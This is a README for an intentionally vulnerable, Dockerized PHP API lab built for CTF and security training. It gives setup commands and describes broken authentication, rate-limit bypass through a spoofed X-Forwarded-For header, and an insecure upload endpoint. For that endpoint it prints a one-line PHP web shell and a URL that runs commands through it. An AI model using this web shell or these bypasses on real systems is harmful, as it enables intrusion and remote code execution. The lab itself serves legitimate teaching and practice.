# 🧪 Hacksudo Vulnerable API Lab

A fully Dockerized vulnerable API ecosystem designed for learning and demonstrating real-world backend flaws such as OTP bypass, insecure authentication, rate-limit bypass, upload vulnerabilities, privilege escalation, and weak API versioning practices.

This lab simulates modern mobile apps + backend authentication workflows — intentionally insecure for ethical hacking, CTF training, and offensive security learning.


---

## 📌 Features

| Component | Vulnerability | Exploit Focus |
|----------|--------------|---------------|
| Login Page | Weak authentication | Credential reuse & bypass |
| API v1 | No auth checks | Direct data access |
| API v2 | Weak rate-limiting | Bypass with headers or concurrency |
| API v3 | File upload bypass | RCE & malicious uploads |
| OTP System | Plain-text storage | Replay & brute-force |
| Privilege Escalation | Broken access control | SUID escalation simulation |

---

## 🧰 Tech Stack

| Component | Details |
|----------|---------|
| Backend | PHP |
| Database | MySQL 5.7 |
| Deployment | Docker + Docker Compose |
| UI Theme | Red/Green Hacker Style |
| Purpose | CTF, Teaching, Pen-Testing Practice |

---

## 🚀 Setup Instructions

### **1️⃣ Clone the Repository**

```bash
git clone https://github.com/hacksudo/api2root.git
cd api2root
```

## Build 
```bash
1. Build 
sudo docker compose build --no-cache
or 
2. Start Containers
sudo docker compose up -d
or
sudo docker compose -f docker-compose.yml up
or
sudo docker compose -f docker-compose.yml --compatibility up -d

3. Verify
sudo docker ps
```
Access Website: 
http://localhost:8080
or http://yourIP:8080

## Reset or Rebuild 
```bash
sudo docker compose down --volumes --remove-orphans
```

---

## 🔥 API Vulnerability Breakdown

### **API v1 — Broken Authentication**
- No authentication or token mechanism
- Allows direct access without validating identity
- Classic example of **Broken Access Control (OWASP A01)**

💥 **Exploit:**  
Send a request to API v1 without any credentials — access is granted.

---

### **API v2 — Weak Rate Limiting**
- Has basic rate-limiting controls, but incorrectly implemented
- Can be bypassed using:
  - Parallel requests (race condition)
  - Proxy header spoofing (`X-Forwarded-For`)
  - Burp Intruder or Turbo Intruder

📌 Example bypass header:
X-Forwarded-For: 127.0.0.1


📚 Demonstrates: **OWASP API4:2019 - Lack of Resources & Rate Limiting**

---

### **API v3 — Insecure File Upload**
- Upload endpoint lacks file type/MIME validation
- Allows dangerous extensions including `.php`, `.php5`, `.svg`, `.html`, `.phar`
- Potentially leads to stored XSS or Remote Code Execution (RCE)

💣 **Exploit:**  
Upload a payload such as:

```php
<?php system($_GET['cmd']); ?>

Then Execute:
http://<target>/uploads/shell.php?cmd=id

